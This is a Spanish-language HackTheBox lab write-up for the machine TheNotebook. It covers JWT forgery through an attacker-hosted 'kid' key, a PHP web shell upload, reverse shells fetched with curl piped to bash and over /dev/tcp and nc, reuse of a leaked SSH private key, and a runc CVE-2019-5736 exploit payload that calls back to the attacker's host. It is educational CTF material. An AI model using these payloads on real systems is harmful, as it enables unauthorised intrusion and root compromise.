---
layout      : post
title       : "HackTheBox - TheNotebook"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png
category    : [ htb ]
tags        : [ docker, JWT, ssh-keys, file-upload, runc, sudo ]
---
Máquina Linux nivel medio. Exploraremos el mundo de los **JSON Web Tokens** para ingresar a una web con permisos administrativos. Jugaremos con llaves **SSH** y romperemos el siempre fiel **Docker** mediante un **CVE** que permite sobreescribir el contenido del binario **/bin/sh** con lo que queramos.

![320thenotebookHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320thenotebookHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [mostwanted002](https://www.hackthebox.eu/profile/120514).

Se ave cina...

Hola, nos enfrentaremos a un inicio muy lindo. Encontraremos un sitio web que nos permite guardar nuestras notas y nada más :O Pero echándole ojo a la cookie veremos algo interesante, es generada mediante `JSON Web Tokens` con una estructura peculiar, la llave con la que lo hace esta siendo llamada mediante una **URL** y cada usuario lleva indicado si es o no admin, aprovecharemos esto para crear un nuevo token que llame la llave de nuestro servidor y también otorgándole permisos a nuestro usuario de ser admin. Esto para finalmente lograr subir archivos en el **Admin Panel** yyy claramente subiremos una Web Shell para obtener una sesión en la máquina como `www-data`.

Cree un script para automatizar todo este proceso y obtener **RCE** en la terminal, échenle un ojazo:

* [RCE_phpfile.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/thenotebook/RCE_phpfile.py).

Enumerando nos toparemos con las llaves `SSH` del usuario `noah`, usaremos su llave privada para obtener una sesión en la máquina sin necesitar la contraseña.

Validando los permisos de administrador que tenemos sobre el sistema, nos daremos cuenta de que podemos ejecutar un contenedor con `Docker`, validando la versión del propio **Docker** y buscando vulnerabilidades relacionadas, encontraremos una que nos permite modificar el contenido del binario `runC` (que se ejecuta siempre que llamemos a **Docker**) y que al mismo tiempo modifica el binario `/bin/sh` con nuestro **payload**, para una vez llamemos una Shell con **/bin/sh** dentro del contenedor se ejecute el payload... Usaremos esto para conseguir una Shell como el usuario `root`, a darleeeee.

...

#### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Vulns conocidas, le cuesta mucho llegar a ser real (pero lo intenta).

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.

...

Nuestro camino a donde gloria:

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Movimiento Lateral **noah**](#movimiento-lateral-noah).
4. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Inicialmente haremos un escaneo de puertos para saber que servicios esta ejecutando la máquina:

```bash
❭ nmap -p- --open -v 10.10.10.230 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535.                                                                                  |
| --open     | Solo los puertos que están abiertos.                                                                      |
| -v         | Permite ver en consola lo que va encontrando.                                                             |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

```bash
❭ cat initScan 
# Nmap 7.80 scan initiated Mon Mar 15 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.230
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.230 ()   Status: Up
Host: 10.10.10.230 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Mon Mar 15 25:25:25 2021 -- 1 IP address (1 host up) scanned in 112.60 seconds
```

A ver, que tenemos...

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)**: Acceso a un servidor remoto por medio de un canal seguro. |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto)**: Servidor web.                |

Ahora hagamos un escaneo de scripts y versiones con base en cada servicio (puerto) encontrado, así validamos a profundidad cada uno:

```bash
❭ nmap -p 22,80 -sC -sV 10.10.10.230 -oN portScan
```

| Parámetro | Descripción |
| ----------|:----------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
❭ cat portScan 
# Nmap 7.80 scan initiated Mon Mar 15 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.230
Nmap scan report for 10.10.10.230
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 15 25:25:25 2021 -- 1 IP address (1 host up) scanned in 11.66 seconds
```

Obtenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80     | HTTP     | nginx 1.14.0                    |

A darle a ver por donde podemos entrar.

...

### Puerto 80 [×](#puerto-80) {#puerto-80}

![320page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80.png)

Un lugar para guardar mis notas o pensamientos... Podemos registrarnos e ingresar al sitio, después de este paso, en el dashboard tenemos:

![320page80_dashboard](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_dashboard.png)

Hagamos caso y veamos las notas: (disculparán el montón de pruebas)

![320page80_notes](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_notes.png)

Algo raro que note fue la URL, no sé, poco usual...

---

### 🌋 ¡Entramos en un Rabbit hole, cuidaoooo!

Después de un rato enumerando, probando, jugando con la URL, etc. Nada. Haciendo fuzz encontramos un directorio llamado `/admin`:

```bash
❭ dirsearch.py -u http://10.10.10.230 -q
403 -    9B  - http://10.10.10.230/admin
200 -    1KB - http://10.10.10.230/login
302 -  209B  - http://10.10.10.230/logout  ->  http://10.10.10.230/
200 -    1KB - http://10.10.10.230/register
```

Pero tenemos un código de estado `403` que nos indica la prohibición completa hacia ese recurso :P Pero jugando con ese mismo recurso encontramos otros directorios:

> [Status code **403 Forbidden**](https://mediatemple.net/community/products/dv/204644980/why-am-i-seeing-a-403-forbidden-error-message).

```bash
❭ dirsearch.py -u http://10.10.10.230/admin -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -q
403 -    9B  - http://10.10.10.230/admin/upload
200 -    3KB - http://10.10.10.230/admin/notes
```

Curioso, tenemos prohibido el acceso al recurso `/a, pero no al `/admin/notes`, veamos si podemos obtener algo de ahí:

![320page80_admin_notes](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_admin_notes.png)

Jmm, intentando agregar notas siempre obtenemos "`Internal Server Error`", peeero si nos fijamos en la URL, a veces cambia como si hiciera la inserción de la nota, veamos un ejemplo rápidamente:

![320page80_admin_notes_add_preview](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_admin_notes_add_preview.png)

![320page80_admin_notes_add_URL](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_admin_notes_add_URL.png)

En la URL se agrega un numero y si validamos si se creó la nota:

![320page80_admin_notes_created](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_admin_notes_created.png)

Y si, se crea... Pero no logre hacer nada con esto :P

---

### 🗻 Salimos del Rabbit hole

Dando vueltas y revisando cositas, nos damos cuenta de algo lindo en nuestra cookie: (podemos verla de varias formas, pero como lo divide el navegador esta bien para que se entienda mejor lo que haremos)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_cookie.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Es un formato que había usado en alguna ocasión y de una me acordé de que trataba (también por el inicio de la cadena (`ey`, que en `base64` es `{"` (o sea el inicio de un JSON e.e))... 

[JSON Web Tokens](https://jwt.io/introduction), que sirven para transmitir información mediante objetos `JSON` de manera segura, esto gracias a que son firmados digitalmente con llaves privadas o públicas.

* [Qué es **JSON Token** y como funciona](https://openwebinars.net/blog/que-es-json-web-token-y-como-funciona/).

Entonces, podemos usar la herramienta [jwt.io](https://jwt.io/) para jugar con estos tokens, así que, tomamos nuestra cookie `auth` y la pegamos a la izquierda:

![320google_jwt_original_output](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320google_jwt_original_output.png)

Algo lindo de esta herramienta es que nos separa por colores (y puntos) las partes del token (cada parte del array que nos mostró el navegador). Cada apartado del token esta en `base64`, la página nos lo decodea y a la derecha tenemos el resultado... (Todo esto podemos cambiarlo, pero antes veamos que hay en cada apartado)

**Header**:

Vemos el tipo de token y el tipo de algoritmo usado yyyyy podemos deducir que esta tomando la llave privada servida en el puerto `7070` del localhost llamada `privKey.key`.

**Payload (Data)**:

Tenemos info del usuario y un campo extraño que hace alusión a algo sobre el administrador y en nuestro caso esta apagado... Interesante.

**Verify signature**:

Acá va la llave privada del host.

...

## Explotación [#](#explotacion) {#explotacion}

Bien, como podemos aprovecharnos de esto...

Sabemos que esta usando una URL para leer la llave privada que usa contra el `JWT`, entonces:

1. Generaremos una llave privada.
2. hostearemos un servidor web. 
3. Y en el **header** pondremos nuestra URL llamando la llave, esto para que la web tome nuestra llave y podamos modificar el token.

En el apartado **payload (data)** aprovecharemos el ítem que habla del `admin` para alterarlo a `true` y ver si nos asignan como administradores del sistema de notas.

Y finalmente agregaremos nuestra llave privada en **verify signature**.

Démosle. Generemos la llave privada, me guie de este [recurso](https://serverfault.com/questions/224122/what-is-crt-and-key-files-and-how-to-generate-them#answer-224127):

**Header:**

```bash
❭ openssl genrsa 2048 > palaKeypa.key
# pero despues de generarla, copiarla y pegarla en la web
# vemos que es más pequeña que la que ya estaba originalmetn en nusetro token,
# asi que le modificamos el tamaño al doble
```

```bash
❭ openssl genrsa 4096 > palaKeypa.key
Generating RSA private key, 4096 bit long modulus (2 primes)
.................................................++++
......................................................................................++++
e is 65537 (0x010001)
❭ chmod 400 palaKeypa.key
```

Entonces, ahora modificamos el **header**: (se puede hacer en la Shell o en la web, para que sea más legible se las mostraré en la web)

```json
{"typ": "JWT","alg": "RS256","kid": "http://10.10.14.194:8000/palaKeypa.key"}
```

Lo pasamos a `base64`:

```bash
❭ echo '{"typ": "JWT","alg": "RS256","kid": "http://10.10.14.194:8000/palaKeypa.key"}' | base64 
eyJ0eXAiOiAiSldUIiwiYWxnIjogIlJTMjU2Iiwia2lkIjogImh0dHA6Ly8xMC4xMC4xNC4xOTQ6
ODAwMC9wYWxhS2V5cGEua2V5In0K
```

Y pegamos en la web (pegado y sin `=`)

![320google_jwt_headerPART](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320google_jwt_headerPART.png)

**Payload (data):**

```json
{"username": "lanz","email": "lanz@lanz.htb","admin_cap": true}
```

```bash
❭ echo '{"username": "lanz","email": "lanz@lanz.htb","admin_cap": true}' | base64
eyJ1c2VybmFtZSI6ICJsYW56IiwiZW1haWwiOiAibGFuekBsYW56Lmh0YiIsImFkbWluX2NhcCI6
IHRydWV9Cg==
```

![320google_jwt_payloadPART](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320google_jwt_payloadPART.png)

**Verify signature:**

Copiamos la llave que generamos (con todo y `--`) y la pegamos en la web en esta parte:

![320google_jwt_signPART](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320google_jwt_signPART.png)

Y listos, tenemos nuestro token generado. Ahora la prueba de fuego.

Hosteamos el servidor web:

```bash
❭ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Tomamos el token, editamos nuestra cookie `auth` por la nueva y simplemente refrescamos la página. Yyyyyyyyyy obtenemos:

```bash
...
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.230 - - [15/Mar/2021 25:25:25] "GET /palaKeypa.key HTTP/1.1" 200 -
```

![320page80_weareasadminLOL](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_weareasadminLOL.png)

¿Ves algo distinto? e.e (Tamos dentro como **admin** fathEEEEEEer, muy lindo esto)

Veamos el nuevo apartado `Admin Panel`:

![320page80_admin_panel](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_admin_panel.png)

![320page80_admin_panel_uploadFiles](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_admin_panel_uploadFiles.png)

Opa, podemos subir archivos y parece que de cualquier tipo, probemos a subir de una un archivo `.php` para generar ejecución remota de comandos. Veamos si nos da algún problema...

```bash
❭ cat toRiCE.php 
<?php $coma=shell_exec($_GET['xmd']); echo $coma; ?>
```

El script simplemente indica: que recibirá una petición mediante el método `GET` y la guardara en la variable `xmd`, esta a su vez, hará una petición al sistema mediante `shell_exec` y el resultado del comando ejecutado se guardará en la variable `$coma`, al final simplemente mostramos ese contenido. Subámoslo, seleccionamos el archivo y damos clic en `Save`, nos devuelve:

![320page80_admin_panel_up_RCEfile](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_admin_panel_up_RCEfile.png)

Veamos el archivo que se subió y probemos de una vez por ejemplo, ver que usuario somos y el hostname:

![320page80_admin_panel_RCE](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320page80_admin_panel_RCE.png)

Perfecto, tenemos ejecución remota de comandos, entablémonos una Reverse Shell...

(El archivo es borrado rápidamente así que debemos ser igual o más rápidos)

Probando y fallando podemos generar un archivo `.sh` que contenga lo que queramos ejecutar en el sistema y simplemente como comando en la web le decimos que haga un `cURL` hacia nuestro script y que a su vez interprete y ejecute el contenido:

```bash
❭ cat rev.sh 
#!/bin/bash

bash -c "bash -i >& /dev/tcp/10.10.14.194/4433 0>&1"
#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1 | nc 10.10.14.194 4433 >/tmp/f
```

Colocamos este archivo en la ruta en que tenemos el servidor de `Python` activo, así evitamos servir otro puerto :P 

Nos ponemos en escucha con `netcat`:

```bash
❭ nc -lvp 4433
listening on [any] 4433 ...
```

Y lanzamos como `payload` para validar que tenemos comunicación y ve nuestro código:

```html
http://10.10.10.230/f34242c373ba88e18f73fd2e0eccd648.php?xmd=curl http://10.10.14.194:8000/rev.sh
```

Y simplemente le agregamos `| bash` para que interprete el contenido del archivo y lo ejecute en el sistema:

```html
http://10.10.10.230/f34242c373ba88e18f73fd2e0eccd648.php?xmd=curl http://10.10.14.194:8000/rev.sh | bash
```

YYYYYYYyyyyYye.e:

![320bash_revSH_www](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320bash_revSH_www.png)

Tamos dentro de la máquina, peeeerfectowowowo.

...

Es un poco MEHH el estar creando el token, modificando la cookie y todo eso manualmente, así que aprovechemos la oportunidad para automatizar toooodo y obtener ejecución de comandos simplemente pasándole el comando que queremos ejecutar a un **script**:

* [RCE_phpfile.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/thenotebook/RCE_phpfile.py).

Ahora sí, sigamos.

...

## Movimiento lateral www-data -> noah [#](#movimiento-lateral-noah) {#movimiento-lateral-noah}

Enumerando el directorio `/var/backups` encontramos un archivo algo llamativo:

```bash
www-data@thenotebook:/var/backups$ ls -la
total 60
drwxr-xr-x  2 root root  4096 Mar 22 08:20 .
drwxr-xr-x 14 root root  4096 Feb 12 06:52 ..
-rw-r--r--  1 root root 33252 Feb 24 08:53 apt.extended_states.0
-rw-r--r--  1 root root  3609 Feb 23 08:58 apt.extended_states.1.gz
-rw-r--r--  1 root root  3621 Feb 12 06:52 apt.extended_states.2.gz
-rw-r--r--  1 root root  4373 Feb 17 09:02 home.tar.gz
```

Copiemos el archivo comprimido e intentemos ver su contenido:

```bash
www-data@thenotebook:/var/backups$ cp home.tar.gz /dev/shm/
www-data@thenotebook:/var/backups$ cd !$
cd /dev/shm/
www-data@thenotebook:/dev/shm$ ls
home.tar.gz
www-data@thenotebook:/dev/shm$ gzip -d home.tar.gz 
www-data@thenotebook:/dev/shm$ ls
home.tar
www-data@thenotebook:/dev/shm$ tar xvf home.tar 
home/
home/noah/
home/noah/.bash_logout
home/noah/.cache/
home/noah/.cache/motd.legal-displayed
home/noah/.gnupg/
home/noah/.gnupg/private-keys-v1.d/
home/noah/.bashrc
home/noah/.profile
home/noah/.ssh/
home/noah/.ssh/id_rsa
home/noah/.ssh/authorized_keys
home/noah/.ssh/id_rsa.pub
```

Opa, el backup del `/home` de un usuario llamado `noah` (efectivamente en la máquina existe), tenemos un par de llaves `SSH`, copiémonos el contenido de la llave privada `(id_rsa)` y creémonos un archivo con su contenido en nuestra máquina, esto para entrar por medio de `SSH` sin tener que ingresar contraseña:

* [Info SSH keys (Español)](https://wiki.archlinux.org/title/SSH_keys_(Espa%C3%B1ol)).

---

```bash
❭ cat key_noah 
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04
HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT
rLymqVzxjEbLUkIgjZNW49ABwi2pDfzoXnij9JK8s3ijIo+w/0RqHzAfgS3Y7t+b
...
❭ chmod 400 key_noah
```

Y ejecutamos hacia la máquina:

```bash
❭ ssh noah@10.10.10.230 -i key_noah 
load pubkey "key_noah": invalid format
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)
...
```

![320bash_SSH_noah](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320bash_SSH_noah.png)

Nice, somos `noah` y tenemos acceso a la flag `user.txt`.

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Si vemos los permisos que tenemos como `root`, encontramos:

```bash
noah@thenotebook:/dev/shm$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

El usuario `noah` puede ejecutar comandos inicialmente en el contenedor `webapp-dev01` y dado el caso en todos los contenedores que empiecen con `webapp-dev01`, veamos que hay dentro, ejecutemos una `bash` en el container:

```bash
noah@thenotebook:/dev/shm$ sudo /usr/bin/docker exec -it webapp-dev01 bash
root@c8d1914f59cd:/opt/webapp# ls -la
total 52
drwxr-xr-x 1 root root 4096 Feb 12 07:30 .
drwxr-xr-x 1 root root 4096 Feb 12 07:30 ..
drwxr-xr-x 1 root root 4096 Feb 12 07:30 __pycache__
drwxr-xr-x 3 root root 4096 Nov 18 13:27 admin
-rw-r--r-- 1 root root 3303 Nov 16 19:43 create_db.py
-rw-r--r-- 1 root root 9517 Feb 11 15:00 main.py
-rw------- 1 root root 3247 Feb 11 15:09 privKey.key
-rw-r--r-- 1 root root   78 Feb 12 07:12 requirements.txt
drwxr-xr-x 3 root root 4096 Nov 19 10:57 static
drwxr-xr-x 2 root root 4096 Nov 18 13:47 templates
-rw-r--r-- 1 root root   20 Nov 20 09:18 webapp.tar.gz
```

Bien, tenemos la estructura y todos los archivos que usa para el servidor web de las notas... Pero enumerando no encontramos nada relevante, así que regresemos y volvamos a enumerar...

Si vemos la versión actual de Docker obtenemos la `18.06.0-ce`:

```bash
noah@thenotebook:~$ docker -v
Docker version 18.06.0-ce, build 0ffa825
```

Buscando vulnerabilidades sobre ella, encontramos el CVE [CVE-2019-5736](https://www.cvedetails.com/cve/CVE-2019-5736/):

* [**Docker 18.06.0-ce** Vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-13534/product_id-28125/Docker-Docker.html).

![320google_CVE_docker18-16-0-ce](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320google_CVE_docker18-16-0-ce.png)

Nos indica que el binario `runc` (que se ejecuta cuando <<ejecutamos>> `Docker`) es vulnerable a ser sobreescrito y por consiguiente indicarle comandos para que sean ejecutados como el usuario `root` en la máquina host :O

> `runC`: ["command-line tool for spawning and running containers"](https://opensource.com/life/16/8/runc-little-container-engine-could).

Nice, busquemos referencias de exploits a ver cuál podemos usar:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320google_CVE_docker18-16-0-ce_githubLIST.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Tenemos varios, dándole unos ojazos, el más sencillo de entender es el de [Frichetten](https://github.com/Frichetten/CVE-2019-5736-PoC), esta hecho en `.go` y solo debemos mover un archivo al sistema, metámosle candela:

* [https://github.com/Frichetten/CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC).

Lo clonamos en nuestra máquina y vemos el archivo `main.go`, explorándolo simplemente debemos modificar la variable `payload`, como prueba haré que nos envíe el resultado del comando `hostname` a nuestro listener en `nc`:

```go
...
// This is the line of shell commands that will execute on the host
var payload = "#!/bin/bash \n hostname | nc 10.10.14.194 4433"
...
```

Bajando un poco (y leyendo el repo) nos indica lo que hará. Tomará el binario `/bin/sh` y lo sobreescribirá para que una vez sea ejecutado `Docker` este llame el binario `runC` y este a su vez sobreescriba el contenido del binario `/bin/sh` para que se transforme en el contenido de nuestra variable `payload` (o sea el comando `hostname` en este caso). Pero veremos la ejecución del payload una vez hagamos el llamado del binario `/bin/sh` (que en esta parte ya estaría modificado) en el contenedor (para esto necesitaremos otra Shell con el usuario `noah`, para primero ejecutar el binario `main` y por segundo ejecutar la explotación (el binario `/bin/sh`)).

Listo, guardamos y creamos el binario:

```bash
❭ go build main.go #Genera el binario "main"
❭ ls
main  main.go  README.md  screenshots
```

Listos, ahora podemos subirlo al contenedor, creemos un servidor en `Python` y de paso pongámonos en escucha con `nc`:

```py
❭ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
❭ nc -lvp 4433
listening on [any] 4433 ...
```

En la máquina víctima indicamos:

```bash
noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 bash
root@c6d778ee6b03:/opt/webapp# cd /dev/shm
# Descargamos el binario a la máquina
root@c6d778ee6b03:/dev/shm# wget http://10.10.14.194:8000/main
...
root@c6d778ee6b03:/dev/shm# ls -la
total 2220
drwxrwxrwt 2 root root      60 Mar 16 19:58 .
drwxr-xr-x 5 root root     360 Mar 16 19:16 ..
-rw-r--r-- 1 root root 2269904 Mar 16 19:42 main
# Damos permisos de ejecución
root@c6d778ee6b03:/dev/shm# chmod +x main
root@c6d778ee6b03:/dev/shm# ls -la
total 2220
drwxrwxrwt 2 root root      60 Mar 16 19:58 .
drwxr-xr-x 5 root root     360 Mar 16 19:16 ..
-rwxr-xr-x 1 root root 2269904 Mar 16 19:42 main
```

Acá estuve perdido un rato, ya que no lograba ejecutarlo:

```bash
root@c6d778ee6b03:/dev/shm# ./main
bash: ./main: Permission denied
root@c6d778ee6b03:/dev/shm# bash main 
main: main: cannot execute binary file
...
```

Dándole vueltas, desistí de ese script y usé otros repositorios, pero no conseguía ejecutar NADA (¿ya puedes imaginar por qué?)...

Pues resulta que si hacemos el mismo procedimiento, pero en el directorio  `/tmp` o incluso en el directorio `/opt/webapp`, ahí si me permite ejecutarlo 🙃 

Claramente por permisos que no entiendo, pero pues X:

```bash
root@c6d778ee6b03:/dev/shm# mv main /tmp/
root@c6d778ee6b03:/dev/shm# cd /tmp/
root@c6d778ee6b03:/tmp# ls -la
total 2264
drwxrwxrwt 1 root root    4096 Mar 16 20:05 .
drwxr-xr-x 1 root root    4096 Mar 16 19:16 ..
-rwxr-xr-x 1 root root 2269904 Mar 16 19:42 main
-rw-r--r-- 1 root root      78 Feb 12 07:12 requirements.txt
-rw-r--r-- 1 root root   32768 Feb 12 07:30 webapp.db
```

Ejecutamos:

```bash
root@c6d778ee6b03:/tmp# ./main 
[+] Overwritten /bin/sh successfully
```

Y se queda a la espera de la ejecución del binario `/bin/sh`, así que abrimos la otra sesión con `SSH` y volvemos a ejecutar el archivo `main`, pero ahora en la nueva Shell indicamos:

```bash
noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
```

Y en la sesión donde esta corriendo el binario `main` obtenemos:

```bash
root@867e71dd120c:/tmp# ./main 
[+] Overwritten /bin/sh successfully
[+] Found the PID: 66
[+] Successfully got the file handle
[+] Successfully got write handle &{0xc0000aa8a0}
root@867e71dd120c:/tmp# 
```

Yyyy en nuestro listener:

```bash
❭ nc -lvp 4433
listening on [any] 4433 ...
10.10.10.230: inverse host lookup failed: Host name lookup failure
connect to [10.10.14.194] from (UNKNOWN) [10.10.10.230] 51878
thenotebook
```

Perfectoooo, estamos hablando con el `host`, entablémonos una Reverse Shell:

```go
...
var payload = "#!/bin/bash \n bash -c 'bash -i >& /dev/tcp/10.10.14.194/4433 0>&1 &'"
...
```

1. Compilamos.
2. Subimos binario `main` al contenedor.
3. Abrimos otra sesión `SSH`.
4. Ejecutamos el binario `main`.
5. Ejecutamos el binario `/bin/sh` en la nueva sesión.
6. Obtenemos nuestra Reverse Sheeeeeeeeeeeeeeell.

![320bash_revSH_root](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320bash_revSH_root.png)

Perfectooooooooooooooooooooooooooo, hacemos tratamiento de la `TTY` y procedemos a ver las flags:

* [Savitar te explica el tratamiento de la **TTY**](https://www.youtube.com/watch?v=GVjNI-cPG6M&t=1689).

![320flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320flags.png)

...

Linda máquina, me fascino el inicio, por lo tanto me cree un script para que haga toooodo el proceso de cambiar la cookie, subir el archivo yyy ejecutar los comandos (:

* [**RCE** mediante el archivo **.php**](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/thenotebook/RCE_phpfile.py)

Muy loco el tema de `Docker` y `runc`, y casi muero intentando ejecutar el binario en esa ruta :( Perooo bueno, se solucionó.

Muchas gracias por pasarse y leerse este montón de texto :P Y nada, a seguir rompiendo todo (: